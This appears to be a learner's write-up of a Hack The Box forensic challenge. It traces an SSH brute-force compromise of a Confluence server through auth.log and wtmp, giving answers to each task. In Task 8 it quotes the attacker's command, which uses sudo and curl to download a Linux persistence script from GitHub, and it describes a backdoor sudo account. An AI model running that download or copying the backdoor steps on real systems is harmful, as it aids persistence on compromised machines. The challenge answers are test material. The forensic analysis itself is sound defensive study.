
Sherlock Scenario
In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.


Task 1
Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

65.2.161.68

By checking the auth.log file provided, Its easy to notice the ip address trying out new user names in very short period of times.
![Pasted image 20240909113316](https://github.com/user-attachments/assets/2dd4fda5-b242-4cea-8069-4c58963a28eb)


Task 2
The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

root
Scrolling down the auth.log file, we notice a "Accepted password" for the user root
![Pasted image 20240909113802](https://github.com/user-attachments/assets/1d0d1b50-7201-4951-97d8-082ba20933be)


Task 3
Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?
2024-03-06 06:32:45

Getting the timestamp from the "session opened for user root" we get 2024-03-6 06:32:44, which is not accepted by the prompt as the correct answer, I open the wtmp file using "utmpdump" command (after searching in the internet how to open the file). and search for the user root and the ip address 65.2.161.68. We get the time 2024-03-06 06:32:45
![Pasted image 20240909113900](https://github.com/user-attachments/assets/ed2339cf-e893-4170-92f8-3c16f180fedf)
![Pasted image 20240909115811](https://github.com/user-attachments/assets/2411257d-8b0f-4ac6-ad62-81f7e89f0c73)


Task 4
SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

37

Just looking bellow the session opened log, we see a session assigned to the user root.
![Pasted image 20240909120541](https://github.com/user-attachments/assets/569f1514-b94e-4931-92b7-e7a46b75cdba)


Task 5
The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

cyberjunkie
Scrolling down, we see a new group is added to /etc/group and /etc/gshadow . This is suspicious. Further down the user is added to the sudo group.
![Pasted image 20240909120937](https://github.com/user-attachments/assets/e3604c37-04e9-4721-98a5-7b02a69826a1)


Task 6
What is the MITRE ATT&CK sub-technique ID used for persistence?

T1136.001

A simple google for matre attack framework on persistence, we note that Local Admin account was created,
![Pasted image 20240909121846](https://github.com/user-attachments/assets/5c2505f1-11a0-4a0e-bcfb-ef3952f671c7)

Task 7
How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)

279

By subtracting the "New Session" from "Removed session" We observe that its 280 seconds. But the does not work. Using the wtmp file to trace the time, we subtract one and get the time as 279
![Pasted image 20240909124054](https://github.com/user-attachments/assets/d5f4f27e-587b-45da-b552-c75d99e6d1a6)
![Pasted image 20240909124145](https://github.com/user-attachments/assets/8a9617ee-6855-473c-9959-f9a25915f3c8)
![Pasted image 20240909124654](https://github.com/user-attachments/assets/ce40421d-c523-47dd-a01a-79fbaa1e15d0)
![Pasted image 20240909115811](https://github.com/user-attachments/assets/21e7e61a-67cd-40fc-ad66-29a3260e9df6)



Task 8
The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Checking the user cyberjunkie activities, we see this command
![Pasted image 20240909125228](https://github.com/user-attachments/assets/97e3b4e5-6537-45d1-9ffd-a8692379506c)


From this Sherlock, I learnt the importance of collaboration between different files or log types so as to come out with accurate results.
